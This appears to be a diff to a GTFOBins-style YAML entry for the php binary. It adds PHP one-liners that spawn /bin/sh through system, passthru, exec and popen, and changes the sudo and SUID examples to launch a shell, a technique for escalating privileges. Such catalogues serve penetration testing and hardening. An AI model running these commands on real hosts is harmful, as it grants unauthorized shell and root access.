@@ -1,31 +1,32 @@
 ---
 functions:
+  execute-interactive:
+  - code: |
+      export CMD="/bin/sh"
+      php -r 'system(getenv("CMD"));'
+  - code: |
+      export CMD="/bin/sh"
+      php -r 'passthru(getenv("CMD"));'
+  - code: |
+      export CMD="/bin/sh"
+      php -r 'print(shell_exec(getenv("CMD")));'
+  - code: |
+      export CMD="/bin/sh"
+      php -r '$r=array(); exec(getenv("CMD"), $r); print(join("\\n",$r));'
+  - code: |
+      export CMD="/bin/sh"
+      php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
   execute-non-interactive:
-    - code: |
-        export CMD="id"
-        php -r 'system(getenv("CMD"));'
-    - code: |
-        export CMD="id"
-        php -r 'passthru(getenv("CMD"));'
-    - code: |
-        export CMD="id"
-        php -r 'print(shell_exec(getenv("CMD")));'
-    - code: |
-        export CMD="id"
-        php -r '$r=array(); exec(getenv("CMD"), $r); print(join(\"\\n\",$r));'
-    - code: |
-        export CMD="id"
-        php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
     - code: |
         export CMD="id"
         php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
   sudo-enabled:
     - code: |
-        CMD="id"
+        CMD="/bin/sh"
         sudo php -r "system('$CMD');"
   suid-enabled:
     - code: |
-        CMD="id"
+        CMD="/bin/sh"
         ./php -r "system('$CMD');"
   upload:
     - description: Serve files in the local folder running an HTTP server.
